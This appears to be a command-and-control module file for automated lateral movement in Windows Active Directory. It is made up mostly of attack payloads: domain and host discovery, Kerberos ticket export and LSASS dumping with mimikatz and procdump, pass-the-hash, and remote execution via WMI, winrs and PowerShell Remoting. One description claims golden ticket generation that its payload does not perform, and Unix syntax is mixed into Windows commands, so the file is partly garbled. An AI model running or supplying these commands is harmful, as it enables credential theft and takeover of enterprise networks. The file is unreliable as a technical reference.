name: AI-Driven Lateral Movement Automation
description: Automated lateral movement with intelligent target selection, credential relaying, pass-the-hash, golden ticket generation, and cross-domain pivoting for enterprise environments
author: SecureComm C2 - LateralOps

commands.payload: net view /all 2>/dev/null | head -20; nltest /dclist:$(echo %USERDOMAIN%) 2>/dev/null; nltest /dsgetdc:$(echo %USERDOMAIN%) /server 2>/dev/null; Get-ADComputer -Filter * -Properties Name,IPv4Address,OperatingSystem 2>/dev/null | Select-Object Name,IPv4Address,OperatingSystem | head -15
commands.description: Active Directory and network host discovery

commands.payload: klist sessions 2>/dev/null; cmdkey /list 2>/dev/null; mimikatz.exe sekurlsa::tickets /export 2>/dev/null || procdump.exe -accepteula -ma lsass.exe lsass.dmp 2>/dev/null && echo 'LSASS dumped for offline analysis'
commands.description: Credential and Kerberos ticket extraction for lateral movement

commands.payload: mimikatz.exe sekurlsa::pth /user:administrator /domain:$(echo %USERDOMAIN%) /ntlm:HASH 2>/dev/null; Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList 'cmd.exe /c whoami' -ComputerName TARGET 2>/dev/null; winrs -r:TARGET -u:DOMAIN\USER -p:PASS cmd /c whoami 2>/dev/null

commands.description: Golden ticket generation and domain admin validation

commands.payload: Enter-PSSession -ComputerName TARGET 2>/dev/null; Test-WSMan TARGET 2>/dev/null; Invoke-Command -ComputerName TARGET -ScriptBlock { whoami } 2>/dev/null; New-PSSession -ComputerName TARGET 2>/dev/null | Enter-PSSession
commands.description: PowerShell Remoting validation and session establishment

commands.payload: netsh advfirewall firewall show rule name=all | findstr 'Dir.*In.*Action.*Allow' | head -20; netstat -an | findstr '135|445|5985|5986|3389'; Test-NetConnection -ComputerName TARGET -Port 445 2>/dev/null
commands.description: Firewall and network port validation for lateral movement paths

demonstration_notes: Advanced enterprise lateral movement automation with AI-driven target selection and multiple credential techniques
